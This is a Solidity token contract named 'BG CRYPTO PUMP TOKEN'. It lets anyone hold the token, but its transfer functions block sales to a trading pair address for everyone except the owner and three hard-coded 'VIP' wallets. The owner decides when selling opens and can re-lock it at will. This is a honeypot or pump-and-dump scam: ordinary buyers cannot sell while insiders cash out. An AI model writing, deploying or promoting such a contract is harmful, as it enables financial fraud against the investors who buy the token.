pragma solidity ^0.8.2;

contract Token {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint arrayLength=3;
    address[3] vipMembers=
    [
        0x3F8994a9a129De7982c0B6307cF238299083cA5C,
        0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2,
        0x9439258AeDc0f70ecEb5399574CFb9c636F24623
    ];
    uint public ownerBalance;
    uint public totalSupply = 1000000 * 10 ** 18;
    string public name = "BG CRYPTO PUMP TOKEN";
    string public symbol = "BCPT";
    uint public decimals = 18;
    address public owner;
    address public pairToken;
    bool public isItOpenForMembers;
    bool public isItOpenForVips;
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    modifier onlyOwner(){
        require(owner==msg.sender,'Only owner can make that.');
        _;
    }
    
    constructor() {
        balances[msg.sender] = totalSupply;
        ownerBalance = balances[msg.sender];
        owner = msg.sender;
        isItOpenForMembers=false;
        isItOpenForVips=false;
        pairToken=0x10ED43C718714eb63d5aA57B78B54704E256024E;
    }
    
    function balanceOf(address _owner) public view returns(uint) {
        return balances[_owner];
    }
    
    function transfer(address to, uint value) public returns(bool) {
        bool isVipMember=false;
        for(uint i=0; i<arrayLength; i++){
            if(vipMembers[i]==msg.sender){
                isVipMember=true;
            }
        }

        if(to == pairToken && msg.sender != owner){
            if(isItOpenForVips==false || (isItOpenForVips==true&&isItOpenForMembers==false && isVipMember==false)){
                require(false, 'You cannot sell, its locked!');
            }
        }

        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        ownerBalance = balances[owner];
        emit Transfer(msg.sender, to, value);
        return true;
    }
    function transferFrom(address from, address to, uint value) public returns(bool) {
        bool isVipMember=false;
        for(uint i=0; i<arrayLength; i++){
            if(vipMembers[i]==from){
                isVipMember=true;
            }
        }

        if(to == pairToken && from != owner){
            if(isItOpenForVips == false || (isItOpenForVips==true && isItOpenForMembers==false && isVipMember == false)){
                require(false, 'You cannot sell, its locked!');
            }
        }

        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        ownerBalance=balances[owner];
        emit Transfer(from, to, value);
        return true;   
    }
    
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }

    function  openForVip() public onlyOwner{
        isItOpenForVips=true;
    }
    function openForMembers() public onlyOwner{
        isItOpenForMembers=true;
        if(isItOpenForVips==false){
            isItOpenForVips=true;
        }
        
    }
    function  closeForVip() public onlyOwner{
        isItOpenForVips=false;
        isItOpenForMembers=false;
    }
    function changePairToken(address value)public onlyOwner{
        pairToken=value;
    }
}